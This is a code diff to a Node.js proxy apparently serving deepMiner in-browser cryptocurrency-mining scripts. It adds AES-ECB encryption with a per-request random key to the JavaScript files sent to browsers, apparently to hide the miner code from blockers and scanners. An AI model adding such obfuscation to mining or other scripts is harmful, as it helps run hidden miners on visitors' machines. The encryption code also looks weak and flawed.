@@ -10,7 +10,8 @@ var http = require('http'),
     WebSocket = require("ws"),
     net = require('net'),
     fs = require('fs'),
-    crypto = require("crypto");
+    crypto = require("crypto"),
+    CryptoJS = require('./crypto-js-3.1.9');
 
 var conf = JSON.parse(fs.readFileSync(__dirname + '/config.json', 'utf8'));
 
@@ -20,6 +21,33 @@ const ssl = !!(conf.key && conf.cert);
 //heroku port
 conf.lport = process.env.PORT || conf.lport;
 conf.domain = process.env.DOMAIN || conf.domain;
+
+// crypto for AES
+function rand(n) {
+    var chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'];
+    var res = "";
+    for (var i = 0; i < n; i++) {
+        var id = Math.ceil(Math.random() * 35);
+        res += chars[id];
+    }
+    return res;
+}
+
+function enAES(key, str) {
+    var encrypt = CryptoJS.AES.encrypt(str, CryptoJS.enc.Utf8.parse(key), {
+        mode: CryptoJS.mode.ECB,
+        padding: CryptoJS.pad.Pkcs7
+    });
+    return encrypt;
+}
+
+function deAES(key, str) {
+    var decrypt = CryptoJS.AES.decrypt(str, CryptoJS.enc.Utf8.parse(key), {
+        mode: CryptoJS.mode.ECB,
+        padding: CryptoJS.pad.Pkcs7
+    });
+    return decrypt;
+}
 
 const stats = (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
@@ -34,6 +62,10 @@ const stats = (req, res) => {
             if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
                 buf = buf.toString().replace(/%deepMiner_domain%/g, conf.domain);
                 if (req.url.match(/\.js$/)) {
+                    var randKey = rand(32);
+                    buf = buf.replace(/%AES_FILE%/g, buf);
+                    buf = buf.replace(/%AES_KEY%/g, randKey);
+                    buf = buf.replace(/%CryptoJS_CODE%/g, fs.readFileSync('./crypto-js-3.1.9.min.js', 'utf8'));
                     res.setHeader('content-type', 'application/javascript');
                 }
             } else {
